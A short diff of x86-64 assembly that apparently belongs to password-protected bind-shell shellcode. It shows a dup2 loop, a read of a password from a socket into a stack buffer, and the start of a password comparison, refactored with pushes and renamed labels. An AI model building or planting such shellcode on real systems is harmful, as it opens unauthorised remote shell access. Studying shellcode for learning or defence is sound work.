@@ -108,16 +108,20 @@ dup2_loop:
     dec esi
     jns dup2_loop
 
-check_password:
-    xor eax, eax
-    ; rdi = fd (bound socket)
-    sub rsp, 16   ; create space for "buf" in the stack
+read_password:
+    ; read(int fd, void *buf, size_t count)
+    ; On success, the number of bytes read is returned
+
+    ;xor eax, eax  ; already done by dup2
+    ;rdi = "new"   ; already done in dup2
+    push rax
+    push rax       ; create space for "buf" in the stack
     push rsp
-    pop rsi       ; rsi = *buf
+    pop rsi        ; rsi = *buf
     mov dl, 16
     syscall
 
-    ; compare password
+compare_password:
     xor ecx, ecx
     mov cl, [rel pass_len]
     lea rdi, [rel password]
